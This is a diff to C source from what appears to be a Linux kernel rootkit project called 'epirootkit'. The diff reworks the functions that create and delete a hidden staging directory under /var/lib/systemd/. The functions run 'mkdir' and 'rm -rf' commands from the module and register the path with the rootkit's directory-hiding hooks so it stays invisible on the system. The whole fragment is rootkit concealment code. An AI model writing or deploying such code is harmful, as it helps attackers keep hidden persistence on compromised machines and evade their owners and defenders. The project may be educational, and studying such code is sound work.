@@ -4,36 +4,40 @@
 #include <linux/string.h>
 
 #include "epirootkit.h"
+#include "interceptor/hooks/hide/hide.h"
 
 #define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
 #define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME
 
-int create_hidden_tmp_dir(void) {
+int create_hidden_tmp_dir(void)
+{
     char cmd[128];
     int rc;
 
-    // Compose the mkdir command
     snprintf(cmd, sizeof(cmd), "mkdir -p -- %s", HIDDEN_DIR_PATH);
     rc = exec_str_as_command(cmd, false);
+    if (rc < 0)
+        return rc;
 
-    // Hide it
-    size_t length = strlen("hooks hide " HIDDEN_DIR_PATH);
-    rootkit_command("hooks hide " HIDDEN_DIR_PATH, length);
+    // Directly add it to your hidden‐dirs list
+    add_hidden_dir(HIDDEN_DIR_PATH);
 
     return SUCCESS;
 }
 
-int remove_hidden_tmp_dir(void) {
+int remove_hidden_tmp_dir(void)
+{
     char cmd[128];
     int rc;
 
-    // Compose the rm -rf command
+    // Remove it on disk
     snprintf(cmd, sizeof(cmd), "rm -rf %s", HIDDEN_DIR_PATH);
-    rc = exec_str_as_command(cmd, 0);
+    rc = exec_str_as_command(cmd, false);
+    if (rc < 0)
+        return rc;
 
-    // Unhide directory
-    size_t length = strlen("hooks unhide " HIDDEN_DIR_PATH);
-    rootkit_command("hooks unhide " HIDDEN_DIR_PATH, length);
+    // Directly remove it from your hidden‐dirs list
+    remove_hidden_dir(HIDDEN_DIR_PATH);
 
     return SUCCESS;
 }
